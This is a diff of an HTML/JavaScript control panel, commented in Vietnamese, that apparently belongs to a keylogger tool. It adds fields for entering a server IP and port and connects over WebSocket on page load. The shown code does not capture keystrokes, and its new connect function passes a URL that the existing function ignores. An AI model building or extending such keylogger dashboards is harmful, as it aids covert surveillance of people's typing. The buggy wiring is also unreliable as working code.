@@ -49,7 +49,13 @@
                 <span id="ws-status" class="badge bg-danger">DISCONNECTED</span>
                 <span id="keylog-status" class="badge bg-secondary ms-3">KEYLOGGER: Dừng</span>
             </h5>
-            <p>WebSocket URL: <code>{{ ws_url }}</code></p>
+            <div class="input-group mt-2">
+                <span class="input-group-text">IP:</span>
+                <input type="text" id="server-ip" class="form-control" value="{{ default_ip }}" placeholder="192.168.1.x">
+                <span class="input-group-text">Port:</span>
+                <input type="text" id="server-port" class="form-control" value="9002" style="max-width: 80px;">
+                <button class="btn btn-primary" onclick="connectManual()">Kết nối</button>
+            </div>
         </div>
         
         <div id="immediate-feedback" role="alert"></div>
@@ -174,7 +180,16 @@
         }
         
         // --- HÀM D: KẾT NỐI VÀ XỬ LÝ WEBSOCKET ---
+        function connectManual() {
+            const ip = document.getElementById('server-ip').value;
+            const port = document.getElementById('server-port').value;
+            const url = `ws://${ip}:${port}`;
+            connectWebSocket(url);
+        }
+
         function connectWebSocket() {
+            if (ws) ws.close();
+
             ws = new WebSocket(wsUrl);
             const statusElement = document.getElementById('ws-status');
             const keylogStatus = document.getElementById('keylog-status');
@@ -403,8 +418,8 @@
             }
         }
 
-        // Khởi chạy khi load trang
-        connectWebSocket(); 
+        // Tự động kết nối theo IP mặc định trong ô input
+        connectManual();
     </script>
     <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/js/bootstrap.bundle.min.js"></script>
 </body>
